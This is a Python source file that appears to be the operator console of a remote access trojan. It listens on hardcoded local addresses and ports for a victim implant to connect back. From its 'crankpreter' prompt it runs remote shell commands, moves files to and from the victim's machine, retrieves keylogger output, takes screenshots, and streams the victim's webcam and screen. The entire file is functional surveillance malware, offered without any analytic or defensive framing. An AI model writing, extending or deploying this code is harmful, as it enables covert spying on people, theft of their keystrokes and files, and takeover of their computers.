import socket
import json
import os
import struct
import pickle
import cv2
import threading
from keylogger import KeyLogger

soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
soc.bind(('192.168.1.18', 9999)) # Input Ip Address & Socket
print('Waiting for connection ...')
soc.listen(1)

connection = soc.accept()
_target = connection[0]
ip = connection[1]
print(_target)
print(f'Connected to  {str(ip)}')

def receivedData():
    data = ''
    while True:
        try:
            data = data + _target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def downloadFile(fileName):
    file = open(fileName, 'wb')
    _target.settimeout(1)
    _file = _target.recv(1024)
    while _file:
        file.write(_file)
        try:
            _file = _target.recv(1024)
        except socket.timeout as e:
            break

    _target.settimeout(None)
    file.close()

def uploadFile(fileName):
    file = open(fileName, 'rb')
    _target.send(file.read())
    file.close()

def convertByteStream():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind(('192.168.1.18', 9998)) # Input Ip Address & Socket
    sock.listen(5)
    connection = sock.accept()
    target = connection[0]
    ip = connection[1]

    byteData = b""
    payloadSize = struct.calcsize("Q")

    while True:
        while (len(byteData)) < payloadSize:
            packet = target.recv(4*1024)
            if not packet: break
            byteData += packet

        packetMsgSize = byteData[:payloadSize]
        byteData = byteData[payloadSize:]
        msgSize = struct.unpack("Q", packetMsgSize)[0]
        while len(byteData) < msgSize:
            byteData += target.recv(4*1024)
        frameData = byteData[:msgSize]
        byteData = byteData[msgSize:]
        frame = pickle.loads(frameData)
        cv2.imshow("Recording ...", frame)
        key = cv2.waitKey(1)
        if key == 27:
            break
    target.close()
    cv2.destroyAllWindows()

def streamWebCam():
    t = threading.Thread(target=convertByteStream)
    t.start()

def ConvertByteStreamScreenRecorder():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind(('192.168.1.18', 9997)) # Input Ip Address & Socket
    sock.listen(5)
    connection = sock.accept()
    target = connection[0]
    ip = connection[1]

    byteData = b''
    payloadSize = struct.calcsize('i')

    while True:
        while (len(byteData)) < payloadSize:
            packet = target.recv(1024)
            if not packet: break
            byteData += packet
        
        packetMsgSize = byteData[:payloadSize]
        byteData = byteData[payloadSize:]
        msgSize = struct.unpack('i', packetMsgSize)[0]
        while len(byteData) < msgSize:
            byteData += target.recv(1024)
        
        frameData = byteData[:msgSize]
        byteData = byteData[msgSize:]
        frame = pickle.loads(frameData)
        cv2.imshow("Recording the Screen ...", frame)
        key = cv2.waitKey(1)
        if key == 27:
            break
        target.close()
        cv2.destroyAllWindows()

def screenRecorder():
    t = threading.Thread(target=ConvertByteStreamScreenRecorder)
    t.start()

def shellComm():
    number = 0
    while True:
        command = input('crankpreter>> ')
        data = json.dumps(command)
        _target.send(data.encode())
        if command in ('quit', 'exit'):
            os.system('clear')
        elif command[:3] == 'cd ':
            pass
        elif command[:8] == 'download':
            downloadFile(command[9:])
        elif command[:6] == 'upload':
            uploadFile(command[7:])
        elif command == 'start keylogger':
            pass
        elif command == 'read data keylogger':
            data = _target.recv(1024).decode()
            print(data)
            downloadFile('log_data.txt')
        elif command == 'stop keylogger':
            pass
        elif command == 'start webcam':
            streamWebCam()
        elif command == 'screenshot':
            number += 1
            file = open("ss"+str(number)+".png", 'wb')
            _target.settimeout(1)
            _file = _target.recv(1024)
            while _file:
                file.write(_file)
                try:
                    _file = _target.recv(1024)
                except socket.timeout as e:
                    break

            _target.settimeout(None)
            file.close()

        elif command == 'start screenrecord':
            screenRecorder()

        else:
            result = receivedData()
            print(result)

shellComm()